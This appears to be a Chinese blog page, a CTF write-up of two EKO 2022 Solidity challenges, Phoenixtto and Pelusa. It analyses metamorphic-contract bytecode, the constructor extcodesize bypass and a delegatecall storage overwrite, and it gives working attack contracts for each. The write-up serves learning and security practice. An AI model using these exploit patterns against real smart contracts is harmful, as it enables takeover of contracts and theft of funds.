@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="全新的CTF系列—–EKO，这应该是ethernaut组织开发出的CTF竞赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EKO-CTF(一)">
+<meta property="og:url" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="全新的CTF系列—–EKO，这应该是ethernaut组织开发出的CTF竞赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317212307898.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317212714977.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317215051448.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319103736153.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104108133.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104409227.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104623486.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319111039606.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319201824164.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319201937424.png">
+<meta property="og:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319202059425.png">
+<meta property="article:published_time" content="2023-03-17T12:59:54.000Z">
+<meta property="article:modified_time" content="2023-03-19T12:31:03.609Z">
+<meta property="article:author" content="lucifer">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317212307898.png">
+
+<link rel="canonical" href="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>EKO-CTF(一) | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/EKO-CTF-%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="知而不行，谓之不诚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EKO-CTF(一)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-17 20:59:54" itemprop="dateCreated datePublished" datetime="2023-03-17T20:59:54+08:00">2023-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-19 20:31:03" itemprop="dateModified" datetime="2023-03-19T20:31:03+08:00">2023-03-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/EKO/" itemprop="url" rel="index"><span itemprop="name">EKO</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>全新的CTF系列—–<a target="_blank" rel="noopener" href="https://www.ctfprotocol.com/tracks/eko2022">EKO</a>，这应该是ethernaut组织开发出的CTF竞赛</p>
+ <span id="more"></span>
+
+<h1 id="Phoenixtto"><a href="#Phoenixtto" class="headerlink" title="Phoenixtto"></a>Phoenixtto</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *     @title Phoenixtto</span><br><span class="line"> *     @author Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage@gmail.com&gt;</span><br><span class="line"> *     @dev Within the world of crossovers there is a special one, where the universes of pokemon,</span><br><span class="line"> *         harry potter and solidity intertwine.</span><br><span class="line"> *         In this crossover a mix creature is created between dumbledore&#x27;s phoenix, a wild ditto and</span><br><span class="line"> *         since we are in the solidity universe this creature is a contract.</span><br><span class="line"> *         We have called it Phoenixtto and it has two important abilities, that of being reborn from</span><br><span class="line"> *         it&#x27;s ashes after its destruction and that of copying the behavior of another bytecode</span><br><span class="line"> *         Try to capture the Phoenixtto, if you can...</span><br><span class="line"> *     @custom:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</span><br><span class="line"> */</span><br><span class="line">contract Laboratory &#123;</span><br><span class="line">    address immutable PLAYER;</span><br><span class="line">    address public getImplementation;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) &#123;</span><br><span class="line">        PLAYER = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mergePhoenixDitto() public &#123;</span><br><span class="line">        reBorn(type(Phoenixtto).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function reBorn(bytes memory _code) public &#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(0, add(0x20, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(0, add(_code, 0x20), mload(_code), 0)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isCaught() external view returns (bool) &#123;</span><br><span class="line">        return Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Phoenixtto &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bool private _isBorn;</span><br><span class="line"></span><br><span class="line">    function reBorn() external &#123;</span><br><span class="line">        if (_isBorn) return;</span><br><span class="line"></span><br><span class="line">        _isBorn = true;</span><br><span class="line">        owner = address(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function capture(string memory _newOwner) external &#123;</span><br><span class="line">        if (!_isBorn || msg.sender != tx.origin) return;</span><br><span class="line"></span><br><span class="line">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span><br><span class="line">        if (newOwner == msg.sender) &#123;</span><br><span class="line">            owner = newOwner;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            selfdestruct(payable(msg.sender));</span><br><span class="line">            _isBorn = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先看看题目解释</p>
+<blockquote>
+<p>Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledore’s phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from it’s ashes after its destruction and that of copying the behavior of another bytecode.<br>Try to capture the Phoenixtto, if you can…</p>
+</blockquote>
+<p>大意是合约有两种特殊的能力，一种是涅槃重生，另一种是复制另一个字节码的行为</p>
+<p>合约代码两不大，很容易能找到通关条件</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317212307898.png" alt="image-20230317212307898"></p>
+<p>只要我们将reborn中部署的Phoenixtto合约的owner改变为自己就行了。</p>
+<p>带着目的我们去审Phoenixtto合约。</p>
+<p>由于在部署Phoenixtto合约时已经进行了reBorn初始化，于是改变owner的点只剩下了capture中的if块，而newOwner的计算方法很明显就是由公钥计算地址的方法，我的第一反应就是传入自己的公钥即可解决这关，但再看就很容易发现问题，capture中限制了使用合约调用，而一旦使用合约进行攻击，就无法让owner变为我们自己，很显然这条路走不通。</p>
+<p>回到Laboratory合约，来研究reBorn函数。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317212714977.png" alt="image-20230317212714977"></p>
+<p>reBorn的逻辑是首先通过我们传入的_code变量也就是合约字节码，部署了对应合约，随后将_code改变成了一串十六进制的数字，看起来像是操作码的样子，继续部署合约，可以看到由于后面调用了Phoenixtoo的reBorn函数，所以后面部署的合约也必须存在reBorn函数。后面使用的通关合约地址也是部署的第二个合约，所以关键点肯定在函数中那一串操作码中，我们对他进行肢解。</p>
+<blockquote>
+<p>* 0x5860208158601c335a63aaf10f428752fa158151803b80938091923cf3<br>*<br>* pc|op|name         | [stack]                                | <memory><br>*<br>* ** 将第一个堆栈项设置为零 **<br>* 00 58 getpc          [0]                                       &lt;&gt;<br>*<br>* ** 将第二个堆栈项设置为32，将是staticcall的长度参数 **<br>* 01 60 push1<br>* 02 20 outsize        [0, 32]                                   &lt;&gt;<br>*<br>* ** 将第三个堆栈项设置为0，将是staticcall的position参数 **<br>* 03 81 dup2           [0, 32, 0]                                &lt;&gt;<br>*<br>* ** 将第四个堆栈项设置为4，将是staticcall的选择器长度参数 **<br>* 04 58 getpc          [0, 32, 0, 4]                             &lt;&gt;<br>*<br>* ** 将第五个堆栈项设置为28，将是staticcall的选择器的position参数 **<br>* 05 60 push1<br>* 06 1c inpos          [0, 32, 0, 4, 28]                         &lt;&gt;<br>*<br>* ** 将第六个堆栈项设置为msg.sender，staticcall的目标地址 **<br>* 07 33 caller         [0, 32, 0, 4, 28, caller]                 &lt;&gt;<br>*<br>* ** 讲第七个堆栈项设置为msg.gas, staticcall的gas限制 **<br>* 08 5a gas            [0, 32, 0, 4, 28, caller, gas]            &lt;&gt;<br>*<br>* ** 将第八个堆栈项设置为选择器，通过mstore存储“what” **<br>* 09 63 push4<br>* 10 aaf10f42 selector [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42]    &lt;&gt;<br>*<br>* ** 将第九个堆栈项设置为0，“where”通过mstore存储 ***<br>* 11 87 dup8           [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42, 0] &lt;&gt;<br>*<br>* ** 调用mstore，从堆栈中消耗8和9，将选择器放在内存中 **<br>* 12 52 mstore         [0, 32, 0, 4, 0, caller, gas]             &lt;0xaaf10f42&gt;<br>*<br>* ** 调用staiccall，使用堆栈2到7，将地址放在内存中 **<br>* 13 fa staticcall     [0, 1 (if successful)]                    <address><br>*<br>* ** 将第二个堆栈项中的成功位翻转为0 **<br>* 14 15 iszero         [0, 0]                                    <address><br>*<br>* ** 将第三个0推送到堆栈，地址在内存中的位置 **<br>* 15 81 dup2           [0, 0, 0]                                 <address><br>*<br>* ** 将地址从内存中的位置放到第三个堆栈项上 **<br>* 16 51 mload          [0, 0, address]                           &lt;&gt;<br>*<br>* ** 将地址放置到要使用的extcodesize的第四个堆栈项 **<br>* 17 80 dup1           [0, 0, address, address]                  &lt;&gt;<br>*<br>* ** 获取extcodecopy的第四个堆栈项的extcodesize **<br>* 18 3b extcodesize    [0, 0, address, size]                     &lt;&gt;<br>*<br>* ** dup和swap大小，供init代码末尾的返回使用 **<br>* 19 80 dup1           [0, 0, address, size, size]               &lt;&gt;<br>* 20 93 swap4          [size, 0, address, size, 0]               &lt;&gt;<br>*<br>* ** 将代码位置0推送到extcodecopy的堆栈和重新排序堆栈项 **<br>* 21 80 dup1           [size, 0, address, size, 0, 0]            &lt;&gt;<br>* 22 91 swap2          [size, 0, address, 0, 0, size]            &lt;&gt;<br>* 23 92 swap3          [size, 0, size, 0, 0, address]            &lt;&gt;<br>*<br>* ** 调用extcodecopy，使用四项，将运行时代码克隆到内存 **<br>* 24 3c extcodecopy    [size, 0]                                 <code><br>*<br>* ** 返回以在内存中部署最终代码 **<br>* 25 f3 return         []                                        <em>deployed!</em></code></address></address></address></memory></p>
+</blockquote>
+<p>以上是这串操作码的具体含义，其实功能远远没有这么复杂，他做的事就是从getImplementation中拿到了他的creationCode从而通过creat2部署合约，我们知道creat2通过部署合约的地址，salt和字节码哈希来计算出部署后的合约地址，由于字节码始终没有发生改变，所以虽然部署的合约是不同的，但部署后的地址永远是相同的。这里其实是经典的Metamorphic Contracts的应用，也就是可升级合约。</p>
+<p>而搞明白了这串操作码的含义之后，我们要做的事也变得简单，只要我们输入的_code合约中的owner是我们自己就ok了，分析到这，开始攻击。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract attck&#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function reBorn() external &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击步骤也很简单，把攻击合约放进reBorn参数即可。但我发现工厂合约在进行题目初始化时已经调用了mergePhoenixDitto函数，因此我们需要先将部署到的Phoenixtto合约自毁掉再部署。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230317215051448.png" alt="image-20230317215051448"></p>
+<p>攻击完成。</p>
+<h1 id="Pelusa"><a href="#Pelusa" class="headerlink" title="Pelusa"></a>Pelusa</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">interface IGame &#123;</span><br><span class="line">    function getBallPossesion() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// &quot;el baile de la gambeta&quot;</span><br><span class="line">// https://www.youtube.com/watch?v=qzxn85zX2aE</span><br><span class="line"></span><br><span class="line">/// @title Pelusa</span><br><span class="line">/// @author https://twitter.com/eugenioclrc</span><br><span class="line">/// @notice Its 1986, you are in the football world cup (Mexico86), help Diego score a goal.</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/pelusa</span><br><span class="line">contract Pelusa &#123;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    address internal player;</span><br><span class="line"></span><br><span class="line">    uint256 public goals = 1;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function passTheBall() external &#123;</span><br><span class="line">        require(msg.sender.code.length == 0, &quot;Only EOA players&quot;);</span><br><span class="line">        /// @dev &quot;la pelota siempre al 10&quot;</span><br><span class="line">        require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;);</span><br><span class="line"></span><br><span class="line">        player = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isGoal() public view returns (bool) &#123;</span><br><span class="line">        // expect ball in owners posession</span><br><span class="line">        return IGame(player).getBallPossesion() == owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function shoot() external &#123;</span><br><span class="line">        require(isGoal(), &quot;missed&quot;);</span><br><span class="line">        /// @dev use &quot;the hand of god&quot; trick</span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;));</span><br><span class="line">        require(success, &quot;missed&quot;);</span><br><span class="line">        require(uint256(bytes32(data)) == 22_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>You just open your eyes and are in Mexico 1986, help Diego to set the score from 1 to 2 goals for a win, do whatever is necessary!</p>
+</blockquote>
+<p>简要意思就是需要将goal变量由1改成2，如果不确定题目意思可以去看看他的工厂合约来确定通过条件</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319103736153.png" alt="image-20230319103736153"></p>
+<p>很明显，goals为2则通关。</p>
+<p>题目比较短，由于需要改变goals变量的值，但是合约中并没有涉及到该变量的改变，所以突破点肯定是shoot函数中的delegatecall。而delegatecall使用的是player的地址，所以我们需要先将我们的攻击合约设置为player。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104108133.png" alt="image-20230319104108133"></p>
+<p>看上去passTheBall的两个限制条件好像比较难同时达到，一边限制了调用者的codelength必须等于0，一边又限制了地址%100==10，看上去我们好像无法通过create2的方法来绕开这个限制。</p>
+<p>但想一想extcodesize与msg.sender.code.length采用了相同的判断方法，所以在合约构造函数中，调用者的codelength同样为0，仍然可以使用create2来绕开这两个限制。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104409227.png" alt="image-20230319104409227"></p>
+<p>然后是shoot函数，首先要求攻击合约的getBallPossesion函数返回的值为owner，值得一提的是因为owner是private immutable变量，所以无法使用web3等库来直接从链上获取到，他是保存在合约的运行时字节码中。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319104623486.png" alt="image-20230319104623486"></p>
+<p>我们可以直接查到合约的部署者，能看到blockhash中取的是当前区块数量，但blockhash只能取到最近的256个区块的区块哈希不包括当前区块，所以第二个参数必然是0，owner就能直接算出来。</p>
+<p>而handOfGod函数就是我们用来改变goals变量的函数，我们只需要将slot1中的数改成2并返回22_06_1986即可。分析完成开始攻击。</p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    Pelusa pel;</span><br><span class="line">    uint256 public goals = 1; </span><br><span class="line">    address public owner;</span><br><span class="line"> </span><br><span class="line">    constructor(address _pel)&#123;</span><br><span class="line">        if(uint256(uint160(address(this))) % 100 == 10)&#123;</span><br><span class="line">            pel = Pelusa(_pel);</span><br><span class="line">            Pelusa(_pel).passTheBall();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setOwner(address _addr)public&#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(_addr, bytes32(0))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handOfGod()public returns(uint256)&#123;</span><br><span class="line">        goals = 2;</span><br><span class="line">        return uint256(22_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBallPossesion() external view returns (address)&#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">contract deploy&#123;</span><br><span class="line">    attack public att;</span><br><span class="line">    function deployed(address _pel)public&#123;</span><br><span class="line">        uint256 salt;</span><br><span class="line">        bytes memory code = abi.encodePacked(type(attack).creationCode,abi.encode(_pel));</span><br><span class="line">        while(true)&#123;</span><br><span class="line">            address _att = address(uint160(uint256(keccak256(</span><br><span class="line">                abi.encodePacked(</span><br><span class="line">                    bytes1(0xff),</span><br><span class="line">                    address(this),</span><br><span class="line">                    bytes32(salt),</span><br><span class="line">                    keccak256(code)</span><br><span class="line">                )</span><br><span class="line">            ))));</span><br><span class="line">            if(uint160(_att)%100==10)&#123;</span><br><span class="line">                att = new attack&#123;salt:bytes32(salt)</span><br><span class="line">                &#125;(_pel);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            salt+=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addBlock()public&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过deploy函数使用create2来跑出对应地址的攻击合约，然后在攻击合约setOwner函数中传入工厂合约的地址，通过区块链浏览器即可查到。</p>
+<p><img src="/2023/03/17/EKO-CTF-%E4%B8%80/image-20230319111039606.png" alt="image-20230319111039606"></p>
